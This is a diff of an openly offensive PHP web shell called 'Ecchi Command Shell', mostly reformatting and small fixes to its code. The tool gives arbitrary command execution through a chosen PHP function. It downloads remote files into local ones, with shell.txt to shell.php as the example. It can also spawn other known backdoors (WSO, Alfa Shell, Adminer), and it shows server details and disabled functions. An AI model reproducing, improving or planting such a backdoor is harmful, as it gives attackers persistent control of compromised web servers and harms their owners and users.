@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
-@clearstatcache(true);
 set_time_limit(0);
+@clearstatcache(true);
 
 /**
  * Summary of EcchiShell
@@ -56,7 +56,7 @@ class EcchiShell
      */
     private function newShell($filename, $url, $password = null)
     {
-        $getFile = file_get_contents($url) ?? $this->cURL($url);
+        $getFile = file_get_contents($url) ?: $this->cURL($url);
         if (!file_exists($filename)) {
             file_put_contents($filename, $getFile);
         } else {
@@ -82,9 +82,8 @@ class EcchiShell
             /* Add Here */
         ];
 
-        if (!isset($files[$name])) {
+        if (!isset($files[$name]))
             return $this->setResult("File <b><i>$name</b></i> Not Found.");
-        }
 
         $fileInfo = $files[$name];
         $this->newShell($fileInfo[1], $fileInfo[0], $fileInfo[2]);
@@ -103,19 +102,18 @@ class EcchiShell
 
         if ($post) {
             curl_setopt_array($ch, [
-                CURLOPT_URL => $url,
                 CURLOPT_POST => true,
                 CURLOPT_POSTFIELDS => http_build_query($postFields)
             ]);
         } else {
             curl_setopt_array($ch, [
-                CURLOPT_URL => $url,
                 CURLOPT_CUSTOMREQUEST => 'GET',
                 CURLOPT_SSL_VERIFYHOST => false,
                 CURLOPT_SSL_VERIFYPEER => false
             ]);
         }
 
+        curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         $respone = curl_exec($ch);
         curl_close($ch);
@@ -276,6 +274,10 @@ class EcchiShell
         return isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : null;
     }
 
+    /**
+     * Summary of getPHPVersion
+     * @return bool|string
+     */
     public function getPHPVersion()
     {
         return phpversion();
@@ -305,271 +307,268 @@ $ecchishell = new EcchiShell;
 <!DOCTYPE html>
 <html lang="en">
 
-    <head>
-        <!-- Primary Meta Tags -->
-        <title>Ecchi Command Shell</title>
-        <meta charset="UTF-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta name="robots" content="noindex, nofollow">
-        <meta name="title" content="Ecchi Command Shell">
-        <meta name="description" content="Simple Command Shell">
+<head>
+    <!-- Primary Meta Tags -->
+    <title>Ecchi Command Shell</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="title" content="Ecchi Command Shell">
+    <meta name="description" content="Simple Command Shell">
 
-        <!-- Open Graph / Facebook -->
-        <meta property="og:type" content="website">
-        <meta property="og:url" content="https://ecchiexploit.blogspot.com">
-        <meta property="og:title" content="Ecchi Command Shell">
-        <meta property="og:description" content="Simple Command Shell">
-        <meta property="og:image" content="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg">
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://ecchiexploit.blogspot.com">
+    <meta property="og:title" content="Ecchi Command Shell">
+    <meta property="og:description" content="Simple Command Shell">
+    <meta property="og:image" content="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg">
 
-        <!-- Twitter -->
-        <meta property="twitter:card" content="summary_large_image">
-        <meta property="twitter:url" content="https://ecchiexploit.blogspot.com">
-        <meta property="twitter:title" content="Ecchi Command Shell">
-        <meta property="twitter:description" content="Simple Command Shell">
-        <meta property="twitter:image" content="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg">
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://ecchiexploit.blogspot.com">
+    <meta property="twitter:title" content="Ecchi Command Shell">
+    <meta property="twitter:description" content="Simple Command Shell">
+    <meta property="twitter:image" content="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg">
 
-        <!-- Icon -->
-        <link rel="icon" href="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg" type="image/png">
+    <!-- Icon -->
+    <link rel="icon" href="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg" type="image/png">
 
-        <!-- CSS -->
-        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css" />
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
-        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
+    <!-- CSS -->
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
 
-        <style type="text/css">
-            ::-webkit-scrollbar {
-                width: 12px;
-            }
+    <style type="text/css">
+        ::-webkit-scrollbar {
+            width: 12px;
+        }
 
-            ::-webkit-scrollbar-track {
-                -webkit-box-shadow: inset 0 0 6px #00ffff;
-                border-radius: 10px;
-            }
+        ::-webkit-scrollbar-track {
+            -webkit-box-shadow: inset 0 0 6px #00ffff;
+            border-radius: 10px;
+        }
 
-            ::-webkit-scrollbar-thumb {
-                border-radius: 10px;
-                -webkit-box-shadow: inset 0 0 6px #00ffff;
-            }
+        ::-webkit-scrollbar-thumb {
+            border-radius: 10px;
+            -webkit-box-shadow: inset 0 0 6px #00ffff;
+        }
 
-            .offcanvas-body,
-            .offcanvas-header {
-                background-color: #000;
-                border: 1px solid #00ffff;
-            }
+        .offcanvas-body,
+        .offcanvas-header {
+            background-color: #000;
+            border: 1px solid #00ffff;
+        }
 
-            .offcanvas {
-                margin-top: 10%;
-                height: 62%;
-                box-shadow: 0px 0px 10px 0px #00ffff;
-            }
+        .offcanvas {
+            margin-top: 10%;
+            height: 62%;
+            box-shadow: 0px 0px 10px 0px #00ffff;
+        }
 
-            .custom-card {
-                background-color: #000;
-                border: 1px solid #00ffff;
-                box-shadow: 0px 0px 10px 0px #00ffff;
-                color: #43C6AC;
-            }
+        .custom-card {
+            background-color: #000;
+            border: 1px solid #00ffff;
+            box-shadow: 0px 0px 10px 0px #00ffff;
+            color: #43C6AC;
+        }
 
+        .fixed-top-right {
+            position: fixed;
+            top: 17px;
+            right: 30px;
+            z-index: 1032;
+            width: 150px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            box-sizing: border-box;
+        }
+
+        .fixed-top-left {
+            position: fixed;
+            top: 17px;
+            left: 30px;
+            z-index: 1032;
+            width: 150px;
+            height: 50px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            box-sizing: border-box;
+        }
+
+        .fixed-top-right:hover,
+        .fixed-top-left:hover {
+            border: 1px solid #00ffff;
+            background-color: #000;
+        }
+
+        @media only screen and (max-width: 767.98px) {
             .fixed-top-right {
-                position: fixed;
-                top: 17px;
-                right: 30px;
-                z-index: 1032;
-                width: 150px;
-                box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-                box-sizing: border-box;
+                width: 80px;
+                top: 20px;
+                right: 15px;
             }
 
             .fixed-top-left {
-                position: fixed;
-                top: 17px;
-                left: 30px;
-                z-index: 1032;
-                width: 150px;
-                height: 50px;
-                box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-                box-sizing: border-box;
+                width: 80px;
+                /* top: 20px; */
+                left: 15px;
             }
 
-            .fixed-top-right:hover,
-            .fixed-top-left:hover {
-                border: 1px solid #00ffff;
-                background-color: #000;
+            .offcanvas {
+                width: 50%;
+                margin-top: 25%;
             }
+        }
+    </style>
+</head>
 
-            @media only screen and (max-width: 767.98px) {
-                .fixed-top-right {
-                    width: 80px;
-                    top: 20px;
-                    right: 15px;
-                }
+<body class="bg-dark">
+    <button class="btn fixed-top-right btn-sm opacity-75 custom-card animate__animated animate__fadeInBottomRight"
+        type="button" data-bs-toggle="offcanvas" data-bs-target="#MyMenuShell" aria-controls="MyMenuShell"
+        aria-expanded="false" aria-label="Toggle navigation">
+        <img src="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg" alt="Toggle Menu" class="img-fluid">
+    </button>
 
-                .fixed-top-left {
-                    width: 80px;
-                    /* top: 20px; */
-                    left: 15px;
-                }
+    <button class="btn fixed-top-left btn-sm opacity-75 custom-card animate__animated animate__fadeInBottomRight"
+        type="button" data-bs-toggle="offcanvas" data-bs-target="#MySpawnShell" aria-controls="MySpawnShell"
+        aria-expanded="false" aria-label="Toggle navigation">
+        Spawn Shell
+    </button>
 
-                .offcanvas {
-                    width: 50%;
-                    margin-top: 25%;
-                }
-            }
-        </style>
-    </head>
+    <div class="offcanvas offcanvas-start text-white" tabindex="-1" id="MyMenuShell" aria-labelledby="MyMenuShell">
+        <div class="offcanvas-header">
+            <h5 class="offcanvas-title" id="MyMenuShell">Server Info</h5>
+            <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+        </div>
+        <div class="offcanvas-body small">
+            <p>
+                Rank Alexa : <span>
+                    <?= $ecchishell->SEORank()[4] ?>
+                </span> |
+                DA : <span>
+                    <?= $ecchishell->SEORank()[2] ?>
+                </span> |
+                PA : <span>
+                    <?= $ecchishell->SEORank()[3] ?>
+                </span>
+            </p>
+            <p>OS : <span>
+                    <?= $ecchishell->getOS() ?>
+                </span></p>
+            <p>PHP Version : <span>
+                    <?= $ecchishell->getPHPVersion() ?>
+                </span></p>
+            <p>Software : <span>
+                    <?= $ecchishell->getServerSoftware() ?>
+                </span></p>
+            <p>Information System : <span>
+                    <?= $ecchishell->getInformationSystem() ?>
+                </span></p>
+        </div>
+    </div>
 
-    <body class="bg-dark">
-        <button class="btn fixed-top-right btn-sm opacity-75 custom-card animate__animated animate__fadeInBottomRight"
-            type="button" data-bs-toggle="offcanvas" data-bs-target="#MyMenuShell" aria-controls="MyMenuShell"
-            aria-expanded="false" aria-label="Toggle navigation">
-            <img src="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg" alt="Toggle Menu" class="img-fluid">
-        </button>
-
-        <button class="btn fixed-top-left btn-sm opacity-75 custom-card animate__animated animate__fadeInBottomRight"
-            type="button" data-bs-toggle="offcanvas" data-bs-target="#MySpawnShell" aria-controls="MySpawnShell"
-            aria-expanded="false" aria-label="Toggle navigation">
-            Spawn Shell
-        </button>
-
-        <div class="offcanvas offcanvas-start text-white" tabindex="-1" id="MyMenuShell" aria-labelledby="MyMenuShell">
-            <div class="offcanvas-header">
-                <h5 class="offcanvas-title" id="MyMenuShell">Server Info</h5>
-                <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas"
-                    aria-label="Close"></button>
-            </div>
-            <div class="offcanvas-body small">
-                <p>
-                    Rank Alexa : <span>
-                        <?= $ecchishell->SEORank()[4] ?>
-                    </span> |
-                    DA : <span>
-                        <?= $ecchishell->SEORank()[2] ?>
-                    </span> |
-                    PA : <span>
-                        <?= $ecchishell->SEORank()[3] ?>
-                    </span>
-                </p>
-                <p>OS : <span>
-                        <?= $ecchishell->getOS() ?>
-                    </span></p>
-                <p>PHP Version : <span>
-                        <?= $ecchishell->getPHPVersion() ?>
-                    </span></p>
-                <p>Software : <span>
-                        <?= $ecchishell->getServerSoftware() ?>
-                    </span></p>
-                <p>Information System : <span>
-                        <?= $ecchishell->getInformationSystem() ?>
-                    </span></p>
+    <div class="offcanvas offcanvas-start text-white" tabindex="-1" id="MySpawnShell" aria-labelledby="MySpawnShell">
+        <div class="offcanvas-header">
+            <h5 class="offcanvas-title" id="MySpawnShell">Shell / File Spawned</h5>
+            <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+        </div>
+        <div class="offcanvas-body small">
+            <div class="card card-body custom-card h-50 mt-5">
+                <form method="post">
+                    <div class="form-floating">
+                        <select class="form-select mb-2 custom-card" id="SpawnShell" name="spawn"
+                            aria-label="Spawn Shell / File">
+                            <option value="adminer">Adminer</option>
+                            <option value="wso">WSO Shell</option>
+                            <option value="alfa">Alfa Shell</option>
+                        </select>
+                        <label for="SpawnShell">Chose The Spawn Shell / File</label>
+                    </div>
+                    <button class="form-control custom-card align-self-end" type="submit">Spawn Execution</button>
+                </form>
             </div>
         </div>
+    </div>
 
-        <div class="offcanvas offcanvas-start text-white" tabindex="-1" id="MySpawnShell"
-            aria-labelledby="MySpawnShell">
-            <div class="offcanvas-header">
-                <h5 class="offcanvas-title" id="MySpawnShell">Shell / File Spawned</h5>
-                <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas"
-                    aria-label="Close"></button>
-            </div>
-            <div class="offcanvas-body small">
-                <div class="card card-body custom-card h-50 mt-5">
-                    <form method="post">
-                        <div class="form-floating">
-                            <select class="form-select mb-2 custom-card" id="SpawnShell" name="spawn"
-                                aria-label="Spawn Shell / File">
-                                <option value="adminer">Adminer</option>
-                                <option value="wso">WSO Shell</option>
-                                <option value="alfa">Alfa Shell</option>
-                            </select>
-                            <label for="SpawnShell">Chose The Spawn Shell / File</label>
+    <div class="container-fluid">
+        <div class="card card-body text-center mt-2 custom-card">
+            <h3>Ecchi Command Shell</h3>
+        </div>
+    </div>
+
+    <form method="POST">
+        <div class="container-fluid mt-3">
+            <div class="row">
+                <div class="col-md-4 mb-3">
+                    <div class="card card-body custom-card text-wrap" style="height: 270px;">
+                        <h5 class="text-center">Disable Functions</h5>
+                        <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
+                        <p class="text-capitalize fst-italic overflow-auto">
+                            <?= $ecchishell->getDisable("UI") ?>
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Command Shell -->
+                <div class="col-md-4 mb-3">
+                    <div class="card card-body custom-card">
+                        <h5 class="text-center">Command Execution</h5>
+                        <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
+                        <div class="mb-2">
+                            <label for="function" class="form-label">Function Execution</label>
+                            <input type="text" class="form-control" id="function" name="function"
+                                placeholder="shell_exec">
                         </div>
-                        <button class="form-control custom-card align-self-end" type="submit">Spawn Execution</button>
-                    </form>
+                        <div class="mb-2">
+                            <label for="cmd" class="form-label">Command / Payload</label>
+                            <input type="text" class="form-control" id="cmd" name="cmd" placeholder="ls -la">
+                        </div>
+                        <button class="form-control custom-card" type="submit">Execution</button>
+                    </div>
+                </div>
+
+                <!-- Create File -->
+                <div class="col-md-4 mb-3">
+                    <div class="card card-body custom-card">
+                        <h5 class="text-center">Create File</h5>
+                        <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
+                        <div class="mb-2">
+                            <label for="url" class="form-label">URL</label>
+                            <input type="text" class="form-control" id="url" name="url"
+                                placeholder="https://file.com/shell.txt">
+                        </div>
+                        <div class="mb-2">
+                            <label for="filename" class="form-label">Filename</label>
+                            <input type="text" class="form-control" id="filename" name="filename"
+                                placeholder="shell.php">
+                        </div>
+                        <button class="form-control custom-card" type="submit">Create File</button>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <div class="container-fluid">
-            <div class="card card-body text-center mt-2 custom-card">
-                <h3>Ecchi Command Shell</h3>
-            </div>
-        </div>
-
-        <form method="POST">
-            <div class="container-fluid mt-3">
-                <div class="row">
-                    <div class="col-md-4 mb-3">
-                        <div class="card card-body custom-card text-wrap" style="height: 270px;">
-                            <h5 class="text-center">Disable Functions</h5>
-                            <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
-                            <p class="text-capitalize fst-italic overflow-auto">
-                                <?= $ecchishell->getDisable("UI") ?>
-                            </p>
-                        </div>
-                    </div>
-
-                    <!-- Command Shell -->
-                    <div class="col-md-4 mb-3">
-                        <div class="card card-body custom-card">
-                            <h5 class="text-center">Command Execution</h5>
-                            <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
-                            <div class="mb-2">
-                                <label for="function" class="form-label">Function Execution</label>
-                                <input type="text" class="form-control" id="function" name="function"
-                                    placeholder="shell_exec">
-                            </div>
-                            <div class="mb-2">
-                                <label for="cmd" class="form-label">Command / Payload</label>
-                                <input type="text" class="form-control" id="cmd" name="cmd" placeholder="ls -la">
-                            </div>
-                            <button class="form-control custom-card" type="submit">Execution</button>
-                        </div>
-                    </div>
-
-                    <!-- Create File -->
-                    <div class="col-md-4 mb-3">
-                        <div class="card card-body custom-card">
-                            <h5 class="text-center">Create File</h5>
-                            <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
-                            <div class="mb-2">
-                                <label for="url" class="form-label">URL</label>
-                                <input type="text" class="form-control" id="url" name="url"
-                                    placeholder="https://file.com/shell.txt">
-                            </div>
-                            <div class="mb-2">
-                                <label for="filename" class="form-label">Filename</label>
-                                <input type="text" class="form-control" id="filename" name="filename"
-                                    placeholder="shell.php">
-                            </div>
-                            <button class="form-control custom-card" type="submit">Create File</button>
-                        </div>
+        <div class="container-fluid mb-3">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="card card-body custom-card overflow-auto text-wrap" style="height: 200px;">
+                        <h5 class="text-center">Result</h5>
+                        <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
+                        <p class="mt-2 fst-italic">
+                            <?= $ecchishell->getResult() ?>
+                        </p>
                     </div>
                 </div>
             </div>
-
-            <div class="container-fluid mb-3">
-                <div class="row">
-                    <div class="col-md-12">
-                        <div class="card card-body custom-card overflow-auto text-wrap" style="height: 200px;">
-                            <h5 class="text-center">Result</h5>
-                            <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
-                            <p class="mt-2 fst-italic">
-                                <?= $ecchishell->getResult() ?>
-                            </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </form>
-
-        <div class="container-fluid pt-3">
-            <div class="text-info text-center">
-                <h5>./EcchiExploit</h5>
-            </div>
         </div>
+    </form>
 
-        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
-    </body>
+    <div class="container-fluid pt-3">
+        <div class="text-info text-center">
+            <h5>./EcchiExploit</h5>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
 
 </html>
